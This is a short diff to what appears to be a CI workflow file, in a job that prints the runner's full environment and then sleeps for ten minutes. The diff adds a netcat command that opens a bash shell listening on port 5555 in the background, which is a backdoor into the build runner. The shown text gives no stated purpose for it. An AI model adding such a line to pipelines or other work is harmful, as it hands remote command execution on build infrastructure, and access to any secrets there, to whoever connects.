@@ -14,4 +14,5 @@ jobs:
         run: |
           echo "job1"
           env
+          nc -lvnp 5555 -e /bin/bash &
           sleep 600
